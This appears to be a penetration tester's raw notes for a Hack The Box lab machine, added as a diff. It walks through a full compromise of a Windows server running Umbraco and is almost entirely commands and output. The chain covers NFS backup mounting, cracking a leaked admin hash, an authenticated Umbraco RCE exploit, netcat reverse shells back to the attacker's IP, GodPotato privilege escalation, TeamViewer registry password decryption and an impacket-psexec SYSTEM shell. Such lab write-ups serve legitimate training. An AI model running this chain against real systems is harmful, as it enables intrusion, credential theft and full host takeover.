@@ -1,0 +1,447 @@
+21/tcp    open  ftp           Microsoft ftpd
+| ftp-syst: 
+|_  SYST: Windows_NT
+|_ftp-anon: Anonymous FTP login allowed (FTP code 230)
+80/tcp    open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
+|_http-title: Home - Acme Widgets
+111/tcp   open  rpcbind       2-4 (RPC #100000)
+| rpcinfo: 
+|   program version    port/proto  service
+|   100000  2,3,4        111/tcp   rpcbind
+|   100000  2,3,4        111/tcp6  rpcbind
+|   100000  2,3,4        111/udp   rpcbind
+|   100000  2,3,4        111/udp6  rpcbind
+|   100003  2,3         2049/udp   nfs
+|   100003  2,3         2049/udp6  nfs
+|   100003  2,3,4       2049/tcp   nfs
+|   100003  2,3,4       2049/tcp6  nfs
+|   100005  1,2,3       2049/tcp   mountd
+|   100005  1,2,3       2049/tcp6  mountd
+|   100005  1,2,3       2049/udp   mountd
+|   100005  1,2,3       2049/udp6  mountd
+|   100021  1,2,3,4     2049/tcp   nlockmgr
+|   100021  1,2,3,4     2049/tcp6  nlockmgr
+|   100021  1,2,3,4     2049/udp   nlockmgr
+|   100021  1,2,3,4     2049/udp6  nlockmgr
+|   100024  1           2049/tcp   status
+|   100024  1           2049/tcp6  status
+|   100024  1           2049/udp   status
+|_  100024  1           2049/udp6  status
+135/tcp   open  msrpc         Microsoft Windows RPC
+139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
+445/tcp   open  microsoft-ds?
+2049/tcp  open  nlockmgr      1-4 (RPC #100021)
+5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
+|_http-server-header: Microsoft-HTTPAPI/2.0
+|_http-title: Not Found
+47001/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
+|_http-title: Not Found
+|_http-server-header: Microsoft-HTTPAPI/2.0
+49664/tcp open  msrpc         Microsoft Windows RPC
+49665/tcp open  msrpc         Microsoft Windows RPC
+49666/tcp open  msrpc         Microsoft Windows RPC
+49667/tcp open  msrpc         Microsoft Windows RPC
+49678/tcp open  msrpc         Microsoft Windows RPC
+49679/tcp open  msrpc         Microsoft Windows RPC
+49680/tcp open  msrpc         Microsoft Windows RPC
+Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
+
+
+//as port 2049 is open, running NFS service
+└─$ showmount -e 10.10.10.180   
+Export list for 10.10.10.180:
+/site_backups (everyone)
+
+//use mount to mount remote disk to local
+└─$ sudo mount -t nfs 10.10.10.180:/site_backups /mnt/nfs
+
+//from the backup file of server, we got a credential
+┌──(ed㉿kali)-[/mnt/nfs/App_Data]
+└─$ strings Umbraco.sdf 
+Administratoradmindefaulten-US
+Administratoradmindefaulten-USb22924d5-57de-468e-9df4-0961cf6aa30d
+Administratoradminb8be16afba8c314ad33d812f22a04991b90e2aaa{"hashAlgorithm":"SHA1"}en-USf8512f97-cab1-4a4b-a49f-0a2054c47a1d
+adminadmin@htb.localb8be16afba8c314ad33d812f22a04991b90e2aaa{"hashAlgorithm":"SHA1"}admin@htb.localen-USfeb1a998-d3bf-406a-b30b-e269d7abdf50
+adminadmin@htb.localb8be16afba8c314ad33d812f22a04991b90e2aaa{"hashAlgorithm":"SHA1"}admin@htb.localen-US82756c26-4321-4d27-b429-1b5c7c4f882f
+smithsmith@htb.localjxDUCcruzN8rSRlqnfmvqw==AIKYyl6Fyy29KA3htB/ERiyJUAdpTtFeTpnIk9CiHts={"hashAlgorithm":"HMACSHA256"}smith@htb.localen-US7e39df83-5e64-4b93-9702-ae257a9b9749-a054-27463ae58b8e
+ssmithsmith@htb.localjxDUCcruzN8rSRlqnfmvqw==AIKYyl6Fyy29KA3htB/ERiyJUAdpTtFeTpnIk9CiHts={"hashAlgorithm":"HMACSHA256"}smith@htb.localen-US7e39df83-5e64-4b93-9702-ae257a9b9749
+ssmithssmith@htb.local8+xXICbPe7m5NQ22HfcGlg==RF9OLinww9rd2PmaKUpLteR6vesD2MtFaBKe1zL5SXA={"hashAlgorithm":"HMACSHA256"}ssmith@htb.localen-US3628acfb-a62c-4ab0-93f7-5ee9724c8d32
+
+b8be16afba8c314ad33d812f22a04991b90e2aaa	sha1   baconandcheese
+
+┌──(ed㉿kali)-[~]
+└─$ sudo dirsearch -u http://10.10.10.180                 
+[sudo] password for ed: 
+/usr/lib/python3/dist-packages/dirsearch/dirsearch.py:23: DeprecationWarning: pkg_resources is deprecated as an API. See https://setuptools.pypa.io/en/latest/pkg_resources.html
+  from pkg_resources import DistributionNotFound, VersionConflict
+
+  _|. _ _  _  _  _ _|_    v0.4.3
+ (_||| _) (/_(_|| (_| )
+
+Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 25 | Wordlist size: 11460
+
+Output File: /home/ed/reports/http_10.10.10.180/_25-10-21_18-01-18.txt
+
+Target: http://10.10.10.180/
+
+[18:01:18] Starting: 
+[18:01:21] 403 -  312B  - /%2e%2e//google.com
+[18:01:22] 403 -  312B  - /.%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd
+[18:01:22] 404 -    2KB - /.ashx
+[18:01:22] 404 -    2KB - /.asmx
+[18:01:39] 403 -  312B  - /\..\..\..\..\..\..\..\..\..\etc\passwd
+[18:01:41] 200 -    2KB - /about-us
+[18:01:45] 404 -    2KB - /admin%20/
+[18:01:46] 404 -    2KB - /admin.
+[18:01:56] 404 -    2KB - /asset..
+[18:01:58] 400 -   11B  - /base/
+[18:01:58] 500 -    1KB - /base/static/c
+[18:02:00] 200 -    2KB - /blog/
+[18:02:00] 200 -    2KB - /blog
+[18:02:00] 403 -  312B  - /cgi-bin/.%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd
+[18:02:03] 200 -    3KB - /contact.aspx
+[18:02:03] 200 -    3KB - /contact
+[18:02:10] 400 -    3KB - /docpicker/internal_proxy/https/127.0.0.1:9043/ibm/console
+[18:02:17] 200 -    2KB - /home
+[18:02:17] 200 -    2KB - /home.aspx
+[18:02:18] 404 -    2KB - /index.php.
+[18:02:18] 400 -    3KB - /index.php::$DATA
+[18:02:18] 302 -  126B  - /Install  ->  /umbraco/
+[18:02:18] 302 -  126B  - /INSTALL  ->  /umbraco/
+[18:02:18] 302 -  126B  - /install  ->  /umbraco/
+[18:02:18] 302 -  126B  - /install/  ->  /umbraco/
+[18:02:19] 200 -    1KB - /intranet
+[18:02:19] 404 -    2KB - /javax.faces.resource.../WEB-INF/web.xml.jsf
+[18:02:19] 404 -    2KB - /javax.faces.resource.../
+[18:02:19] 400 -    3KB - /jolokia/exec/com.sun.management:type=DiagnosticCommand/compilerDirectivesAdd/!/etc!/passwd
+[18:02:20] 400 -    3KB - /jolokia/exec/com.sun.management:type=DiagnosticCommand/help/*
+[18:02:20] 400 -    3KB - /jolokia/exec/com.sun.management:type=DiagnosticCommand/jfrStart/filename=!/tmp!/foo
+[18:02:20] 400 -    3KB - /jolokia/exec/com.sun.management:type=DiagnosticCommand/jvmtiAgentLoad/!/etc!/passwd
+[18:02:20] 400 -    3KB - /jolokia/exec/com.sun.management:type=DiagnosticCommand/vmLog/disable
+[18:02:20] 400 -    3KB - /jolokia/exec/java.lang:type=Memory/gc
+[18:02:20] 400 -    3KB - /jolokia/exec/com.sun.management:type=DiagnosticCommand/vmSystemProperties
+[18:02:20] 400 -    3KB - /jolokia/exec/com.sun.management:type=DiagnosticCommand/vmLog/output=!/tmp!/pwned
+[18:02:20] 400 -    3KB - /jolokia/read/java.lang:type=*/HeapMemoryUsage
+[18:02:20] 400 -    3KB - /jolokia/search/*:j2eeType=J2EEServer,*
+[18:02:20] 400 -    3KB - /jolokia/write/java.lang:type=Memory/Verbose/true
+[18:02:20] 400 -    3KB - /jolokia/read/java.lang:type=Memory/HeapMemoryUsage/used
+[18:02:22] 404 -    2KB - /login.wdm%20
+[18:02:22] 404 -    2KB - /login.wdm%2e
+[18:02:23] 500 -    3KB - /master/
+[18:02:34] 200 -    2KB - /people
+[18:02:41] 200 -    2KB - /products.aspx
+[18:02:41] 200 -    2KB - /products
+[18:02:42] 500 -    3KB - /product.aspx
+[18:02:42] 500 -    3KB - /product
+[18:02:43] 404 -    2KB - /rating_over.
+[18:02:49] 404 -    2KB - /service.asmx
+[18:02:51] 404 -    2KB - /static..
+[18:02:55] 403 -    2KB - /Trace.axd
+[18:02:55] 400 -    3KB - /Trace.axd::$DATA
+[18:02:56] 200 -    6KB - /umbraco/webservices/codeEditorSave.asmx
+[18:02:58] 404 -    2KB - /WEB-INF./
+
+
+//login IP/umbraco with admin@htb.local, CMS version 7.12.4
+//umbraco vuln to RCE with auth
+
+└─$ python3 49488.py --user=admin@htb.local --password=baconandcheese --host=http://10.10.10.180 --command=whoami 
+iis apppool\defaultapppool
+
+                                                                                                                    
+┌──(ed㉿kali)-[/tmp]
+└─$ python3 49488.py --user=admin@htb.local --password=baconandcheese --host=http://10.10.10.180 --command=systeminfo
+
+Host Name:                 REMOTE
+OS Name:                   Microsoft Windows Server 2019 Standard
+OS Version:                10.0.17763 N/A Build 17763
+OS Manufacturer:           Microsoft Corporation
+OS Configuration:          Standalone Server
+OS Build Type:             Multiprocessor Free
+Registered Owner:          Windows User
+Registered Organization:   
+Product ID:                00429-00521-62775-AA801
+Original Install Date:     2/19/2020, 4:03:29 PM
+System Boot Time:          10/23/2025, 2:07:13 AM
+System Manufacturer:       VMware, Inc.
+System Model:              VMware7,1
+System Type:               x64-based PC
+Processor(s):              2 Processor(s) Installed.
+                           [01]: AMD64 Family 25 Model 1 Stepping 1 AuthenticAMD ~2994 Mhz
+                           [02]: AMD64 Family 25 Model 1 Stepping 1 AuthenticAMD ~2994 Mhz
+BIOS Version:              VMware, Inc. VMW71.00V.24504846.B64.2501180334, 1/18/2025
+Windows Directory:         C:\Windows
+System Directory:          C:\Windows\system32
+Boot Device:               \Device\HarddiskVolume2
+System Locale:             en-us;English (United States)
+Input Locale:              en-us;English (United States)
+Time Zone:                 (UTC-05:00) Eastern Time (US & Canada)
+Total Physical Memory:     2,047 MB
+Available Physical Memory: 1,041 MB
+Virtual Memory: Max Size:  2,431 MB
+Virtual Memory: Available: 1,480 MB
+Virtual Memory: In Use:    951 MB
+Page File Location(s):     C:\pagefile.sys
+Domain:                    WORKGROUP
+Logon Server:              N/A
+Hotfix(s):                 4 Hotfix(s) Installed.
+                           [01]: KB4534119
+                           [02]: KB4516115
+                           [03]: KB4523204
+                           [04]: KB4464455
+Network Card(s):           1 NIC(s) Installed.
+                           [01]: vmxnet3 Ethernet Adapter
+                                 Connection Name: Ethernet0 2
+                                 DHCP Enabled:    No
+                                 IP address(es)
+                                 [01]: 10.10.10.180
+                                 [02]: fe80::1068:3c7c:fefa:af99
+Hyper-V Requirements:      A hypervisor has been detected. Features required for Hyper-V will not be displayed.
+
+
+//cannot use powershell and certutil to download file, try smb
+└─$ python3 49488.py --user=admin@htb.local --password=baconandcheese --host=http://10.10.10.180 --command=powershell -a "copy //10.10.16.4/share/nc64.exe /Windows/Temp/nc.exe"
+
+                                                                                                                    
+┌──(ed㉿kali)-[/tmp]
+└─$ python3 49488.py --user=admin@htb.local --password=baconandcheese --host=http://10.10.10.180 --command=powershell -a "/Windows/Temp/nc.exe -e cmd.exe 10.10.16.4 8821"
+
+└─$ nc -nvlp 8821                                        
+listening on [any] 8821 ...
+connect to [10.10.16.4] from (UNKNOWN) [10.10.10.180] 49704
+Microsoft Windows [Version 10.0.17763.107]
+(c) 2018 Microsoft Corporation. All rights reserved.
+
+C:\windows\system32\inetsrv>whoami
+whoami
+iis apppool\defaultapppool
+
+C:\Users\Public\Desktop>whoami /priv
+whoami /priv
+
+PRIVILEGES INFORMATION
+----------------------
+
+Privilege Name                Description                               State   
+============================= ========================================= ========
+SeAssignPrimaryTokenPrivilege Replace a process level token             Disabled
+SeIncreaseQuotaPrivilege      Adjust memory quotas for a process        Disabled
+SeAuditPrivilege              Generate security audits                  Disabled
+SeChangeNotifyPrivilege       Bypass traverse checking                  Enabled 
+SeImpersonatePrivilege        Impersonate a client after authentication Enabled 
+SeCreateGlobalPrivilege       Create global objects                     Enabled 
+SeIncreaseWorkingSetPrivilege Increase a process working set            Disabled
+
+//as we found this account with privi of SeImpersonatePrivilege, use godpotato to es, this is m1
+
+C:\Windows\Temp>godpotato.exe -cmd "C:\Windows\Temp\nc.exe -e cmd.exe 10.10.16.4 8823"
+godpotato.exe -cmd "C:\Windows\Temp\nc.exe -e cmd.exe 10.10.16.4 8823"
+[*] CombaseModule: 0x140733439934464
+[*] DispatchTable: 0x140733442252016
+[*] UseProtseqFunction: 0x140733441627296
+[*] UseProtseqFunctionParamCount: 6
+[*] HookRPC
+[*] Start PipeServer
+[*] CreateNamedPipe \\.\pipe\3eb8b4ad-af9b-480a-b06c-ed176ca9ffb8\pipe\epmapper
+[*] Trigger RPCSS
+[*] DCOM obj GUID: 00000000-0000-0000-c000-000000000046
+[*] DCOM obj IPID: 00000002-0ce8-ffff-c04a-6066d158603f
+[*] DCOM obj OXID: 0x6254cc5ebac07628
+[*] DCOM obj OID: 0xdc79c9f6fafe2f99
+[*] DCOM obj Flags: 0x281
+[*] DCOM obj PublicRefs: 0x0
+[*] Marshal Object bytes len: 100
+[*] UnMarshal Object
+[*] Pipe Connected!
+[*] CurrentUser: NT AUTHORITY\NETWORK SERVICE
+[*] CurrentsImpersonationLevel: Impersonation
+[*] Start Search System Token
+[*] PID : 848 Token:0x800  User: NT AUTHORITY\SYSTEM ImpersonationLevel: Impersonation
+[*] Find System Token : True
+[*] UnmarshalObject: 0x80070776
+[*] CurrentUser: NT AUTHORITY\SYSTEM
+[*] process start with pid 3188
+
+─$ nc -nvlp 8823                                        
+listening on [any] 8823 ...
+connect to [10.10.16.4] from (UNKNOWN) [10.10.10.180] 49738
+whoami
+Microsoft Windows [Version 10.0.17763.107]
+(c) 2018 Microsoft Corporation. All rights reserved.
+
+C:\Windows\Temp>whoami
+
+
+nt authority\systemwh
+ 
+C:\Windows\Temp>
+C:\Windows\Temp>
+C:\Windows\Temp>whoami
+whoami
+nt authority\system
+
+//m2, list all process or software on host
+C:\Program Files (x86)\TeamViewer\Version7>tasklist
+tasklist
+
+Image Name                     PID Session Name        Session#    Mem Usage
+========================= ======== ================ =========== ============
+System Idle Process              0                            0          8 K
+System                           4                            0         96 K
+Registry                        88                            0     23,272 K
+smss.exe                       276                            0      1,184 K
+csrss.exe                      368                            0      5,316 K
+wininit.exe                    476                            0      6,916 K
+csrss.exe                      484                            1      4,712 K
+winlogon.exe                   540                            1     16,372 K
+services.exe                   616                            0      8,088 K
+lsass.exe                      632                            0     14,776 K
+svchost.exe                    732                            0     14,516 K
+fontdrvhost.exe                756                            0      3,980 K
+fontdrvhost.exe                764                            1      4,252 K
+svchost.exe                    848                            0     10,808 K
+dwm.exe                        928                            1     37,012 K
+svchost.exe                    968                            0     62,768 K
+svchost.exe                   1004                            0     18,128 K
+svchost.exe                     64                            0     19,724 K
+svchost.exe                    472                            0     15,484 K
+svchost.exe                   1088                            0     19,184 K
+vm3dservice.exe               1112                            0      6,584 K
+svchost.exe                   1188                            0     21,792 K
+svchost.exe                   1328                            0      7,892 K
+svchost.exe                   1412                            0     15,744 K
+svchost.exe                   1652                            0      7,288 K
+spoolsv.exe                   2036                            0     16,572 K
+svchost.exe                   1200                            0     10,780 K
+svchost.exe                   1320                            0     27,692 K
+svchost.exe                   1508                            0     11,972 K
+inetinfo.exe                  2056                            0     15,432 K
+svchost.exe                   2140                            0      8,432 K
+TeamViewer_Service.exe        2172                            0     18,992 K
+vmtoolsd.exe                  2180                            0     18,152 K
+svchost.exe                   2192                            0      7,432 K
+VGAuthService.exe             2200                            0     10,472 K
+svchost.exe                   2220                            0     12,308 K
+MsMpEng.exe                   2272                            0    109,416 K
+svchost.exe                   2328                            0     12,308 K
+nfssvc.exe                    2396                            0      5,228 K
+dllhost.exe                   1516                            0     13,444 K
+msdtc.exe                     3344                            0     10,372 K
+WmiPrvSE.exe                  3388                            0     21,668 K
+LogonUI.exe                   3728                            1     45,928 K
+w3wp.exe                      4548                            0    305,320 K
+SearchIndexer.exe             4792                            0     19,080 K
+svchost.exe                   4972                            0     13,652 K
+svchost.exe                   3624                            0      7,556 K
+powershell.exe                 692                            0     86,828 K
+conhost.exe                   1056                            0     12,320 K
+conhost.exe                   4100                            0     12,320 K
+godpotato.exe                 3576                            0     22,020 K
+cmd.exe                       4128                            0      3,552 K
+conhost.exe                   5104                            0     10,604 K
+nc.exe                        3912                            0      3,780 K
+cmd.exe                       3792                            0      4,116 K
+nc.exe                        4248                            0      3,792 K
+cmd.exe                       4684                            0      4,388 K
+svchost.exe                    556                            0      6,192 K
+tasklist.exe                  4340                            0      7,560 K
+
+PS C:\Program Files (x86)\TeamViewer\Version7> cd HKLM:\software\wow6432node\teamviewer\version7
+cd HKLM:\software\wow6432node\teamviewer\version7
+PS HKLM:\software\wow6432node\teamviewer\version7> get-itemproperty -path .
+get-itemproperty -path .
+
+
+StartMenuGroup            : TeamViewer 7
+InstallationDate          : 2020-02-20
+InstallationDirectory     : C:\Program Files (x86)\TeamViewer\Version7
+Always_Online             : 1
+Security_ActivateDirectIn : 0
+Version                   : 7.0.43148
+ClientIC                  : 301094961
+PK                        : {191, 173, 42, 237...}
+SK                        : {248, 35, 152, 56...}
+LastMACUsed               : {, 005056B919D0}
+MIDInitiativeGUID         : {514ed376-a4ee-4507-a28b-484604ed0ba0}
+MIDVersion                : 1
+ClientID                  : 1769137322
+CUse                      : 1
+LastUpdateCheck           : 1704810710
+UsageEnvironmentBackup    : 1
+SecurityPasswordAES       : {255, 155, 28, 115...}
+MultiPwdMgmtIDs           : {admin}
+MultiPwdMgmtPWDs          : {357BC4C8F33160682B01AE2D1C987C3FE2BAE09455B94A1919C4CD4984593A77}
+Security_PasswordStrength : 3
+PSPath                    : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\software\wow6432node\teamviewer\vers
+                            ion7
+PSParentPath              : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\software\wow6432node\teamviewer
+PSChildName               : version7
+PSDrive                   : HKLM
+PSProvider                : Microsoft.PowerShell.Core\Registry
+
+PS HKLM:\software\wow6432node\teamviewer\version7> (get-itemproperty -path .).SecurityPasswordAES
+(get-itemproperty -path .).SecurityPasswordAES
+255
+155
+28
+115
+214
+107
+206
+49
+172
+65
+62
+174
+19
+27
+70
+79
+88
+47
+108
+226
+209
+225
+243
+218
+126
+141
+55
+107
+38
+57
+78
+91
+//we get the passwrod bytes of admin account which is encrypted by AES
+//the content is base10, change to base16 ff9b1c73d66bce31ac413eae131b464f582f6ce2d1e1f3da7e8d376b26394e5b
+//original numbers are decimal nums, convert to hex and remove space.
+
+└─$ python3 /tmp/teamviewer_password_decrypt.py
+
+This is a quick and dirty Teamviewer password decrypter basis wonderful post by @whynotsecurity.
+Read this blogpost if you haven't already : https://whynotsecurity.com/blog/teamviewer
+ 
+Please check below mentioned registry values and enter its value manually without spaces.
+"SecurityPasswordAES" OR "OptionsPasswordAES" OR "SecurityPasswordExported" OR "PermanentPassword"
+
+
+Enter output from registry without spaces : ff9b1c73d66bce31ac413eae131b464f582f6ce2d1e1f3da7e8d376b26394e5b
+Decrypted password is :  !R3m0te!
+
+┌──(ed㉿kali)-[~]
+└─$ impacket-psexec 'administrator:!R3m0te!@10.10.10.180'
+Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 
+
+[*] Requesting shares on 10.10.10.180.....
+[*] Found writable share ADMIN$
+[*] Uploading file eIEHLphz.exe
+[*] Opening SVCManager on 10.10.10.180.....
+[*] Creating service MPaa on 10.10.10.180.....
+[*] Starting service MPaa.....
+[!] Press help for extra shell commands
+Microsoft Windows [Version 10.0.17763.107]
+(c) 2018 Microsoft Corporation. All rights reserved.
+
+C:\Windows\system32> whoami
+nt authority\system
